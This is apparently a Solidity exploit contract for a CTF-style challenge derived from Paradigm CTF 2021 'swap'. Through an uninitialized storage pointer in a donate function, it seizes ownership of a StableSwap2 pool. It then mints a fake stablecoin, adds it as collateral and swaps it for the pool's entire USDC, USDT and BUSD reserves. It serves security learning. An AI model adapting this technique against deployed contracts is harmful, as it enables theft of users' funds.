// SPDX-License-Identifier: UNLICENSED
// Exploit is using uninitialized storage pointer which is in StableSwap2.donate variable "buyBack".

// Below are links where issue is described:
// 1) Overridden modifiers are ignored in control flow analysis resulting in missing uninitialized storage error. #11483
//      https://github.com/ethereum/solidity/issues/11483
// 2) Uninitialized storage pointer not detected #10821
//      https://github.com/ethereum/solidity/issues/10821
// 3) Issue description in twitter post
//      https://twitter.com/ylv_io/status/1445104519239643157?ref_src=twsrc%5Etfw

// Contract StableSwap2 core logic was taken from "Paradigm CTF 2021 - swap".
// Original CTF description: https://samczsun.com/paradigm-ctf-2021-swap/
// CTF code: https://github.com/paradigm-operations/paradigm-ctf-2021/blob/c84e7307769cdf08e76ab32755e0d3816ad3bff4/swap/public/contracts/Swap.sol
// CTF solution: https://github.com/paradigm-operations/paradigm-ctf-2021/blob/master/swap/private/Exploit.sol
// Bug from original CTF was fixed with 0.6.5 https://solidity.ethereum.org/2020/04/06/memory-creation-overflow-bug/
// Exploit.sol "array trick" was changed with 0.5.0 and since then 
//      1) array length has to match with actual length 
//      2) long arrays cost a lot of gas.

pragma solidity 0.8.0;

import "./StableSwap2.sol";
import "./Setup.sol";
import "hardhat/console.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20PresetFixedSupply} from "@openzeppelin/contracts/token/ERC20/presets/ERC20PresetFixedSupply.sol";

contract Exploit {
    StableSwap2 public swap;
    address public setup;
    ERC20 public USDC;
    ERC20 public USDT;
    ERC20 public BUSD;
    ERC20PresetFixedSupply public USDF;

    constructor(StableSwap2 instance) payable {
        swap = instance;
        setup = swap.owner();
        console.log("Setup  address is %s ", setup);
        USDC = ERC20(address(swap.underlying(0)));
        USDT = ERC20(address(swap.underlying(1)));
        BUSD = ERC20(address(swap.underlying(2)));

        console.log("USDC name is %s ", USDC.name());
        console.log("USDT name is %s ", USDT.name());
        console.log("BUSD name is %s ", BUSD.name());

        callFaucet(1000);

        USDC.approve(address(swap), 1000000);
        USDT.approve(address(swap), 1000000);
        BUSD.approve(address(swap), 1000000);
        console.log("Our swap balance is %s ", swap.balances(address(this)));
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 100;
        amounts[1] = 0;
        amounts[2] = 0;
        swap.mint(amounts);
        console.log("Our swap balance is %s ", swap.balances(address(this)));

        console.log("Owner before donation is %s ", swap.owner());
        swap.donate(1);
        console.log("Owner after donation is  %s ", swap.owner());

        USDF = new ERC20PresetFixedSupply(
            "USDF Stablecoin",
            "USDF",
            100000,
            address(this)
        );
        swap.addCollateral(address(USDF));
        USDF.approve(address(swap), 100000);

        console.log(
            "Before swap USDC, USDT, BUSD balances are %s, %s, %s ",
            USDC.balanceOf(address(swap)),
            USDT.balanceOf(address(swap)),
            BUSD.balanceOf(address(swap))
        );
        swap.swap(address(USDF), USDC.balanceOf(address(swap)), address(USDC));
        swap.swap(address(USDF), USDT.balanceOf(address(swap)), address(USDT));
        swap.swap(address(USDF), BUSD.balanceOf(address(swap)), address(BUSD));
        console.log(
            "After swap USDC, USDT, BUSD balances are %s, %s, %s ",
            USDC.balanceOf(address(swap)),
            USDT.balanceOf(address(swap)),
            BUSD.balanceOf(address(swap))
        );
    }

    function callFaucet(uint256 amount) public {
        console.log("USDC  balance is %s ", USDC.balanceOf(address(this)));
        Setup(setup).faucet(amount);
        console.log("USDC  balance is %s ", USDC.balanceOf(address(this)));
    }
}
